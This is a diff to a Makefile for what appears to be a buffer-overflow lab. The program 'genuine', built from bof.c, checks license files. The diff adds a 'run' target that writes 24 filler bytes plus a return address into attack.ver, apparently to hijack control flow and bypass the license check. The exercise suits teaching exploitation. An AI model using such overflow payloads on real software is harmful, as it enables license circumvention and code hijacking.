@@ -5,12 +5,17 @@ all: genuine
 genuine: bof.c
 	$(CC) $(CFLAGS) $+ -o $@
 
-run-full:
+
+runf:
 	./genuine full.ver
 
-run-trial:
+runt:
 	./genuine trial.ver
 
-clean:
-	rm -rf genuine
+run:
+	perl -e 'print "a"x24 . "\xd3\x06\x40"' > attack.ver && ./genuine attack.ver
+# 4006d3
+# 400769
 
+clean:
+	rm -rf genuine* test core*
